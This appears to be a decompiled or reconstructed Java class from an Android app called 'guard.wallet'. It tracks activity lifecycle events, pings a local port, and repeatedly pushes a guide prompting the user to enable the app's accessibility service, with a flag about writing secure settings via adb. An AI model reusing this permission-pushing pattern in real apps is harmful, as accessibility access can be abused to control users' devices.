package com.guard.wallet.lifecycle;

import com.guard.wallet.core.AppUtils;
import android.app.Activity;
import android.app.Application.ActivityLifecycleCallbacks;
import android.os.Bundle;
import android.util.Log;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.activity.GuideActivity;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.permission.PermissionManager;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.DeviceUtils;
import com.guard.wallet.utils.SharedPrefsManager;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.TimeUnit;

/**
 * Activity 生命周期跟踪器 — 监控目标 Activity 的生命周期回调。
 *
 * vendor 原始路径: l/a.java
 *
 * 功能:
 *   - 判断 Activity 是否为目标主 Activity (排除 GuideActivity)
 *   - 在 create/start/resume/pause/stop/destroy 回调中更新 PermissionManager 的 Activity 引用
 *   - onActivityResumed 中执行语言检测、HTTP ping、无障碍检查等
 *   - onActivityDestroyed 中清理无障碍弹窗引用
 */
public final class ActivityLifecycleTracker implements ActivityLifecycleCallbacks {

    private static final String TAG = "CustomActivityLifecycleCallbacks";
    private static final String TAG_MAIN = "AbsMainActivity";

    /**
     * 判断给定 Activity 是否为目标主 Activity。
     * vendor 原始: l.a.a(Activity) — 排除 GuideActivity，检查 buildConfig.mainActivity
     *
     * @param activity 待检查的 Activity
     * @return true 如果是目标主 Activity
     */
    public static boolean isTargetActivity(Activity activity) {
        if (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null) {
            return false;
        }
        if (activity.getComponentName() == null) {
            return false;
        }
        if (Objects.equals(activity.getComponentName().getClassName(), GuideActivity.class.getName())) {
            return false;
        }
        return AppUtils.B(MainApplication.getInstance().getBuildConfig().getMainActivity())
                || Objects.equals(activity.getComponentName().getClassName(),
                        MainApplication.getInstance().getBuildConfig().getMainActivity());
    }

    @Override
    public final void onActivityCreated(Activity activity, Bundle savedInstanceState) {
        Log.d(TAG, TAG + " onActivityCreated");
        if (isTargetActivity(activity)) {
            PermissionManager.setActivity(activity);
        }
    }

    /**
     * vendor 原始: bytecode 重建。
     * 如果是目标 Activity，更新 PermissionManager 引用，
     * 然后 synchronized 检查 activityRef 是否与当前 activity 相同 -> log "mainActivity start"
     */
    @Override
    public final void onActivityStarted(Activity activity) {
        Log.d(TAG, TAG + " onActivityStarted");
        if (isTargetActivity(activity)) {
            PermissionManager.setActivity(activity);
            if (PermissionManager.instance != null) {
                synchronized (PermissionManager.class) {
                    if (PermissionManager.activityRef != null
                            && PermissionManager.activityRef.get() != null
                            && Objects.equals(activity, PermissionManager.activityRef.get())) {
                        Log.d(TAG_MAIN, "mainActivity start");
                    }
                }
            }
        }
    }

    @Override
    public final void onActivityResumed(Activity activity) {
        Log.d(TAG, TAG + " onActivityResumed");
        if (isTargetActivity(activity)) {
            PermissionManager.setActivity(activity);
            if (PermissionManager.instance != null) {
                PermissionManager pm = PermissionManager.instance;
                pm.getClass();
                if (PermissionManager.getActivity() != null) {
                    // Resolve locale from available context
                    String langPref = DeviceUtils.deviceIdCache;
                    android.content.Context ctx;
                    if (PermissionManager.getActivity() != null && PermissionManager.getActivity().getBaseContext() != null) {
                        ctx = PermissionManager.getActivity().getBaseContext();
                    } else if (LockActivity.b() != null && LockActivity.b().getBaseContext() != null) {
                        ctx = LockActivity.b().getBaseContext();
                    } else if (MainApplication.getBaseCtx() != null) {
                        ctx = MainApplication.getBaseCtx();
                    } else {
                        ctx = null;
                    }

                    String lang = DeviceUtils.getLanguageTag(ctx);
                    String resolvedLang = lang;
                    if (AppUtils.B(lang)) {
                        if (!AppUtils.B(Locale.getDefault().toLanguageTag())) {
                            resolvedLang = Locale.getDefault().toLanguageTag();
                        } else {
                            resolvedLang = Locale.getDefault().getLanguage();
                        }
                    }

                    if (!AppUtils.B(resolvedLang)) {
                        String normalized = resolvedLang.replace("_", "-");
                        String finalLang = normalized;
                        if (!AppUtils.B(normalized)) {
                            String[] parts = normalized.split("-");
                            finalLang = normalized;
                            if (parts != null && parts.length >= 2) {
                                String prefix = parts[0];
                                String suffix = parts[parts.length - 1];
                                finalLang = prefix;
                                if (!AppUtils.B(suffix)) {
                                    finalLang = prefix.concat("-").concat(suffix);
                                }
                            }
                        }
                        SharedPrefsManager.E(finalLang);
                    }

                    HttpApiManager.getDeviceId("http://127.0.0.1:7911");
                    if (MyAccessibilityService.P() == null) {
                        boolean showGuide;
                        if (com.guard.wallet.utils.GuideDialogUtils.currentActivityRef != null
                                && com.guard.wallet.utils.GuideDialogUtils.currentActivityRef.get() != null
                                && !(com.guard.wallet.utils.GuideDialogUtils.currentActivityRef.get() instanceof GuideActivity)) {
                            showGuide = false;
                        } else {
                            showGuide = true;
                        }

                        if (showGuide) {
                            // vendor: new e.a(pm, 0) — case 0: check adb/accessibility then show guide
                            PermissionManager.executor.schedule((Runnable) () -> {
                                if (!com.guard.wallet.utils.SystemHelper.j()) {
                                    boolean adbCanWrite;
                                    synchronized (SharedPrefsManager.class) {
                                        adbCanWrite = SharedPrefsManager.e("adbCanWriteSecure");
                                    }
                                    if (!adbCanWrite) {
                                        com.guard.wallet.utils.GuideDialogUtils.triggerGuideFlow();
                                    }
                                }
                            }, 500L, TimeUnit.MILLISECONDS);
                        }
                    } else {
                        com.guard.wallet.utils.GuideDialogUtils.dismissGuideDialog();
                    }
                }
            }
        }
    }

    @Override
    public final void onActivityPaused(Activity activity) {
        Log.d(TAG, TAG + " onActivityPaused");
        if (isTargetActivity(activity)) {
            PermissionManager.setActivity(activity);
            if (PermissionManager.instance != null) {
                synchronized (PermissionManager.class) {
                    if (PermissionManager.activityRef != null
                            && PermissionManager.activityRef.get() != null
                            && Objects.equals(activity, PermissionManager.activityRef.get())) {
                        Log.d(TAG_MAIN, "mainActivity pause");
                    }
                }
            }
        }
    }

    /**
     * vendor 原始: bytecode 重建。
     * 如果是目标 Activity，更新 PermissionManager 引用，
     * 然后 synchronized 检查 activityRef 是否与当前 activity 相同 -> log "mainActivity stop"
     */
    @Override
    public final void onActivityStopped(Activity activity) {
        Log.d(TAG, TAG + " onActivityStopped");
        if (isTargetActivity(activity)) {
            PermissionManager.setActivity(activity);
            if (PermissionManager.instance != null) {
                PermissionManager.instance.getClass();
                synchronized (PermissionManager.class) {
                    if (PermissionManager.activityRef != null
                            && PermissionManager.activityRef.get() != null
                            && Objects.equals(activity, PermissionManager.activityRef.get())) {
                        Log.d(TAG_MAIN, "mainActivity stop");
                    }
                }
            }
        }
    }

    /**
     * vendor 原始: bytecode 重建。
     * 如果是目标 Activity，synchronized 检查 activityRef ->
     * log "AbsMainActivity destroy GuideActivity dismiss"，
     * 然后检查 GuideDialogUtils.guideDialogRef WeakRef 是否存在 -> 调用 dismissGuideDialog() 关闭弹窗
     */
    @Override
    public final void onActivityDestroyed(Activity activity) {
        Log.d(TAG, TAG + " onActivityDestroyed");
        if (isTargetActivity(activity)) {
            synchronized (PermissionManager.class) {
                if (PermissionManager.activityRef != null
                        && PermissionManager.activityRef.get() != null
                        && Objects.equals(activity, PermissionManager.activityRef.get())) {
                    Log.d(TAG_MAIN, "AbsMainActivity destroy GuideActivity dismiss");
                    // Check if accessibility dialog WeakRef is still alive, then dismiss
                    java.lang.ref.WeakReference<android.app.AlertDialog> dialogRef =
                            com.guard.wallet.utils.GuideDialogUtils.guideDialogRef;
                    boolean hasDialog = dialogRef != null && dialogRef.get() != null;
                    if (hasDialog) {
                        com.guard.wallet.utils.GuideDialogUtils.dismissGuideDialog();
                    }
                }
            }
        }
    }

    @Override
    public final void onActivitySaveInstanceState(Activity activity, Bundle outState) {
        Log.d(TAG, TAG + " onActivitySaveInstanceState");
    }

    @Override
    public final void onActivityPreCreated(Activity activity, Bundle savedInstanceState) {
        Log.d(TAG, TAG + " onActivityPreCreated");
        ActivityLifecycleCallbacks.super.onActivityPreCreated(activity, savedInstanceState);
    }

    @Override
    public final void onActivityPreSaveInstanceState(Activity activity, Bundle outState) {
        Log.d(TAG, TAG + " onActivityPreSaveInstanceState");
        ActivityLifecycleCallbacks.super.onActivityPreSaveInstanceState(activity, outState);
    }
}
